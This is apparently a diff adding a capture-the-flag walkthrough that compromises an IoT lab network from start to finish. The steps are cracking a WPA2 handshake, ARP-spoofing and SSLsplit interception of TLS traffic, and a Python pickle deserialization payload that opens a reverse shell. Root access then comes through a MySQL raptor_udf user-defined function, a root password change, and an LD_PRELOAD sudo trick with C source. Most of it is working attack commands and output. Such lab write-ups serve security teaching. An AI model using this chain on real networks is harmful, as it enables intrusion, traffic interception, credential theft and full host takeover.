@@ -1,0 +1,316 @@
+# Capture a WPA handshake
+airodump-ng wlan1mon --essid ctf -w ctf
+aireplay-ng -0 0 -a <BSSID> wlan1mon
+
+# Clean the capture file
+wpaclean ctf-clean.cap ctf-01.cap
+
+# Prepare the hccapx for hashcat processing
+/usr/lib/hashcat-utils/cap2hccapx.bin ctf-clean.cap ctf.hccap ctf
+
+# Use hashcat with a dico to crack the WPA2 handshake
+hashcat -m 2500 ctf.hccap dico.txt
+
+# Connect to the WIFI network and scan it
+nmap -A -T4 10.0.42.0/24
+
+#########################	OUTPUT	####################################
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-28 21:52 CEST
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Stats: 0:00:34 elapsed; 253 hosts completed (2 up), 2 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 32.10% done; ETC: 21:53 (0:01:08 remaining)
+Nmap scan report for 10.0.42.1
+Host is up (0.011s latency).
+All 1000 scanned ports on 10.0.42.1 are filtered
+MAC Address: 74:DA:38:26:C1:86 (Edimax Technology)
+Too many fingerprints match this host to give specific OS details
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT      ADDRESS
+1   10.74 ms 10.0.42.1
+
+Nmap scan report for 10.0.42.149
+Host is up (0.050s latency).
+All 1000 scanned ports on 10.0.42.149 are filtered
+MAC Address: 12:42:2A:00:2A:5E (Unknown)
+Too many fingerprints match this host to give specific OS details
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT      ADDRESS
+1   50.25 ms 10.0.42.149
+
+Nmap scan report for 10.0.42.219
+Host is up (0.000055s latency).
+All 1000 scanned ports on 10.0.42.219 are closed
+Too many fingerprints match this host to give specific OS details
+Network Distance: 0 hops
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 256 IP addresses (3 hosts up) scanned in 107.96 seconds
+########################################################################
+
+# Not much hum...
+
+# First MITM between the client and the server
+echo "1" > /proc/sys/net/ipv4/ip_forward
+iptables -t nat -A POSTROUTING -j MASQUERADE
+arpspoof -i wlan0 -t 10.0.42.149 10.0.42.1
+
+
+# Then launch wireshark and analyse the traffic
+# Not much happening, except regular connections from client to server TCP/65535
+# According to the capture it looks like a TLS encrypted session
+# Indeed, there seams to be a certificate exchange at the beginning of the sessions
+
+
+# Setup SSLsplit and capture the SSL encrypted data
+sslsplit -l logs/connections.log -S logs -c sslsplit.crt -k sslsplit.key ssl 10.0.42.219 4242
+
+# Redirect TCP/65535 to TCP/4242 on the attacker machine
+iptables -t nat -A PREROUTING -p tcp --dport 65535 -j DNAT --to-destination 10.0.42.219:4242
+
+
+#########################	CLI OUTPUT	################################
+
+ssl 10.0.42.149 60904 10.0.42.1 65535 sni:10.0.42.1 names:server.philantropia/10.0.42.1 sproto:TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384 dproto:TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384 origcrt:B03711E3969AB9D68909F701265565B5D8735089 usedcrt:24D9FE1803802BFC9DB9C5727641A27C0A4DC014
+...
+########################################################################
+#########################	LOGGED PAYLOAD	############################
+
+POST /json HTTP/1.1
+Host: 10.0.42.1:65535
+Connection: keep-alive
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
+Content-Type: application/json
+Authorization: Basic <supaSekret>==
+Content-Length: 225
+
+{"method": "validate", "payload": "<supaSekret>=="}HTTP/1.1 200 OK
+Transfer-Encoding: chunked
+Date: Sat, 02 Jun 2018 12:53:41 GMT
+Content-Type: application/json
+Server: Apache 2.0
+
+########################################################################
+
+# So now we have the base64 basic auth token and the JSON POST payload
+# payload that seems to contain a base64 encoded string
+
+We can extract a user and a password from the decoded authorization header:
+user: iot
+pwd: <supaSekret>
+
+
+# The decoded payload contains some interesting stuff like a flag and what appears to be serialized datas
+# The __main__ kinda recall python, and the previously found password mentionned pickle, a python serialization module
+# According to this logic, S means string, I means integers and we're looking at some data structure, maybe an object
+
+########################################################################
+#########################	DECODED PAYLOAD	############################
+
+(i__main__
+worker
+p0
+(dp1
+S'temp'
+p2
+I34
+sS'workerId'
+p3
+I42
+sS'epoch'
+p4
+I1528007274
+sS'flag'
+p5
+S'{flag}a8ead603f2'
+p6
+sS'seq'
+p7
+I4209
+sb.
+
+########################################################################
+
+# First flag spotted. Way to go \o/
+# Pickle, like other serialization modules in multiple languages, suffers from a vulnerability linked to deserialization
+# Indeed we can specify how an object is deserialized using a special method called "__reduce__"
+# And this method may lead to system call. In other word a RCE may be lying here allowing us to execute system commands with the service user
+
+# To test this, we can try to send a custom serialized object to the server:
+
+
+########################################################################
+#########################	EXAMPLE OBJECT	############################
+
+class exploit (object):
+	def __reduce__(self):
+		return (os.system, ("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" % (reverseIp, reversePort),))
+
+########################################################################
+
+# We can either replace the legitimate client payload with ours, or simply code an HTTPs client that will serialize such an object
+# put it in a JSON payload, craft the HTTP request and send it to the server
+# Of course we're gonna do the further
+
+<INSERT THE EXPLOIT SOURCE CODE HERE>
+
+# Get a real shell once the reverse poped
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+# There is some interesting stuff in /home/iot
+
+iot@server:~$ ls -alh
+ls -alh
+total 660K
+drwxr-xr-x 2 iot  iot  4.0K Jun  3 22:38 .
+drwxr-xr-x 3 root root 4.0K Jun  2 02:15 ..
+lrwxrwxrwx 1 root root    9 Jun  3 14:13 .bash_history -> /dev/null
+lrwxrwxrwx 1 root root    9 Jun  3 14:14 .mysql_history -> /dev/null
+-rw-r--r-- 1 iot  iot    17 Jun  3 19:43 flag.txt
+-rw-r--r-- 1 iot  iot  1.3K Jun  3 20:44 server.crt
+-rw------- 1 iot  iot  1.7K Jun  3 20:44 server.key
+-rw-r--r-- 1 iot  iot  625K Jun  4 03:30 server.log
+-rwxr-xr-x 1 iot  iot  7.7K Jun  3 21:06 server.py
+
+# First of all flag.txt.
+# And what appears to be the running server
+
+iot@server:~$ ps aux|grep python
+
+root       581  0.0  0.2   5916  1444 ?        S    Jun03   0:00 sudo -b -u iot python /home/iot/server.py
+iot        585  1.2  5.0  28156 25540 ?        S    Jun03   3:23 python /home/iot/server.py
+root      1051  0.1  2.1  35352 10652 ?        Sl   Jun03   0:21 /usr/bin/python3 /usr/bin/fail2ban-server -s /var/run/fail2ban/fail2ban.sock -p /var/run/fail2ban/fail2ban.pid -x -b
+iot       1653  0.0  0.0   1432   412 ?        S    03:30   0:00 sh -c python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.42.219",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+iot       1654  0.0  1.2   8900  6476 ?        S    03:30   0:00 python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.42.219",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+iot       1658  0.0  0.9   6864  4760 ?        S    03:31   0:00 python -c import pty; pty.spawn("/bin/bash")
+iot       1667  0.0  0.1   2088   556 pts/1    S+   03:34   0:00 grep python
+
+
+# Let's take a look at the source code
+
+dbHost = "127.0.0.1"
+dbUsr = "root"
+dbPwd = <supaSekret>
+db = "ctf"
+dbTable = "ctf"
+
+# So there's a DB running on the server.
+
+iot@server:~$ ps aux|grep mysql
+
+root       943  0.0  0.5   4620  2592 ?        S    Jun03   0:00 /bin/bash /usr/bin/mysqld_safe --user=root --plugin-dir=/usr/lib/mysql
+root      1129  0.3 13.1 633492 66512 ?        Sl   Jun03   1:03 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql --user=root --skip-log-error --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306
+root      1130  0.0  0.2   5500  1012 ?        S    Jun03   0:00 logger -t mysqld -p daemon error
+iot       1675  0.0  0.1   2088   536 pts/1    S+   03:38   0:00 grep mysql
+
+# Mysql... Runnning as root... That will come in handy later.
+# First connect to mariaDB using the credentials from server.py
+
+MariaDB [ctf]> SHOW TABLES;
+SHOW TABLES;
++---------------+
+| Tables_in_ctf |
++---------------+
+| ctf           |
+| flag          |
++---------------+
+2 rows in set (0.00 sec)
+
+MariaDB [ctf]> SELECT * FROM flag;
+SELECT * FROM flag;
++------------------+
+| flag             |
++------------------+
+| {flag}926f17458d |
++------------------+
+1 row in set (0.00 sec)
+
+# Yup, that's the fird flag
+# Nothing interesting in ctf table
+
+# Now let's have fun with raptor_udf and try to get a root shell
+
+# Download raptor_udf2.c from your machine
+https://www.exploit-db.com/download/1518.c
+
+# Make it available to the server with simpleHTTPServer
+python -m "SimpleHTTPServer" 80
+
+# Then download it fom the server
+wget 10.0.42.219/raptor_udf2.c
+
+# Compile it
+gcc -g -c raptor_udf2.c
+gcc -g -shared -o raptor_udf2.so raptor_udf2.o -lc
+
+# Thanks to ps -aux we know that mysql uses /usr/lib/mysql to store its plugins and user defined functions (--plugin-dir=/usr/lib/mysql)
+# Launch MySQL as root again
+mysql -u root -p mysql
+
+# And create the raptor user defined function
+create table raptor(line blob);
+insert into raptor values(load_file('/tmp/raptor_udf2.so'));
+select * from raptor into dumpfile '/usr/lib/mysql/raptor_udf2.so';
+create function do_system returns integer soname 'raptor_udf2.so';
+select * from func;
+
+ * +-----------+-----+----------------+----------+
+ * | name      | ret | dl             | type     |
+ * +-----------+-----+----------------+----------+
+ * | do_system |   2 | raptor_udf2.so | function |
+ * +-----------+-----+----------------+----------+
+ 
+select do_system('id > /tmp/out; chown iot.iot /tmp/out');
+select do_system('ls -alh /root >> /tmp/out');
+select do_system('cat /root/flag.txt >> /tmp/out');
+
+# And now we get the root flag \o/
+
+# To go a little bit further, we can allow incoming connections on the server in iptables and change root password to connect via SSH
+select do_system("iptables -P INPUT ACCEPT");
+select do_system("echo 'root:root' | chpasswd");
+
+# Now let's p0wn the client
+# We can assume that he suffer the same serialization flaw than the server
+# So we can modfy the server a bit to server a malicious payload to the client
+
+
+<INSERT THE EXPLOIT SOURCE CODE HERE>
+
+# Once we get a shell on the client we ca first grab the flag.txt
+# Then sudo -l give us some interesting output
+
+iot@client:/root$ sudo -l
+Matching Defaults entries for iot on client:
+    env_reset, env_keep+=LD_PRELOAD, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User iot may run the following commands on client:
+    (ALL : ALL) NOPASSWD: /usr/bin/find
+
+
+# So iot can launch "find without password, and the use of LD_PRELOAD env variable is enable
+# We can use it to gain a root shell
+
+# Create w00t.c
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init () {
+	unsetenv ("LD_PRELOAD");
+	setgid (0);
+	setuid (0);
+	system ("/bin/sh");
+}
+
+gcc -fPIC -shared -o w00t.so w00t.c -nostartfiles
+sudo LD_PRELOAD=/tmp/w00t.so find
+
+And here is a nice root shell
+Now /root/flag.txt
